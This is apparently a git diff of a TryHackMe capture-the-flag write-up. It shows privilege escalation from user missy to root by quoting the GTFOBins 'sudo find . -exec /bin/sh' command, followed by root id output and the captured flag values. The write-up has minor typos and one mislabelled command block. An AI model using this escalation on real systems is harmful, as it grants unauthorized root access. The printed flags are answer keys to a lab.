@@ -905,15 +905,28 @@ cat ./Documents/flag1.txt`
 THM-42828719920544
 ```
 * `history` output of missy user suggets exploitation of `find` sodo dlegation.
-* GTFObins result for "find + sudo".
+* [GTFObins](https://gtfobins.github.io/gtfobins/find/) has exploit for sudo `find`.
+
 > ## Sudo
 > If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
 > sudo find . -exec /bin/sh \; -quit
-> find / -name rootflag 2>/bin/null
 
+* Used sudo exploit.
+```
+find / -name rootflag 2>/bin/null
+```
+* This elevate missy user to root.
+```
+h-4.2# id
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+```
+* Searched for "flag2.txt".
+```
+find / -name rootflag 2>/bin/null
 /home/rootflag
-
-s /home/rootflag/
-flag2.txt
-sh-4.2# cat /home/rootflag/flag2.txt 
+```
+* Recovered flag2.
+```
+cat /home/rootflag/flag2.txt 
 THM-168824782390238
+```
